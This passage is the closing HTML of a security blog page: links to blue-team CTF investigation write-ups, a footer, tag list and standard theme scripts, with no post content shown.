ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Pretium/"><div class="card-body"> <em class="timeago small" date="2022-04-08 18:33:00 +0200" >Apr 8, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(BTLO/Investigation) - Pretium</h3><div class="text-muted small"><p> The Security Operations Center at Defense Superior are monitoring a customer’s email gateway and network traffic (Crimeson LLC). CTF is hosted on https://blueteamlabs.online/ Scenario ...</p></div></div></a></div><div class="card"> <a href="/posts/Miner/"><div class="card-body"> <em class="timeago small" date="2022-04-08 18:33:00 +0200" >Apr 8, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Miner</h3><div class="text-muted small"><p> Our detection team reported that they receive an IDS alert related to reconnaissance but they were unable to read the traffic as it was encrypted. Pcap files and analysis tools are available on the...</p></div></div></a></div><div class="card"> <a href="/posts/Memory_Analysis-Ransomware/"><div class="card-body"> <em class="timeago small" date="2022-05-23 13:00:00 +0200" >May 23, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(BTLO/Challenge) - Memory Analysis - Ransomware</h3><div class="text-muted small"><p> The Account Executive called the SOC earlier and sounds very frustrated and angry. He stated he can’t access any files on his computer and keeps receiving a pop-up stating that his files have been ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Anubis/" class="btn btn-outline-primary" prompt="Older"><p>Anubis</p></a> <a href="/posts/Pretium/" class="btn btn-outline-primary" prompt="Newer"><p>(BTLO/Investigation) - Pretium</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
